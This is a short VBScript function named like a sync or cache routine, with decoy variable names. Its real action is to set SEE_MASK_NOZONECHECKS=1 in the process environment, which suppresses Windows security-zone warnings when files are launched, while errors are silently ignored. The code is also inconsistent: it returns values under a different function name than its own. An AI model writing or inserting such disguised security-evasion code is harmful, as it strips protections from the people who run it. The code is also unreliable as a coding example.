Function UnpackSyncDelta12()
On Error Resume Next
  Dim strConfigData73,strConfigData57,strToken370
  Set strConfigData73=CreateObject("WScript.Shell")
  strConfigData57=strConfigData73.ExpandEnvironmentStrings("%TEMP%")
  strToken370=strConfigData73.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strConfigData57)>0 And Len(strToken370)>0 Then
    strConfigData73.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadCacheLine12=1
    Exit Function
  End If
  ReadCacheLine12=0
End Function

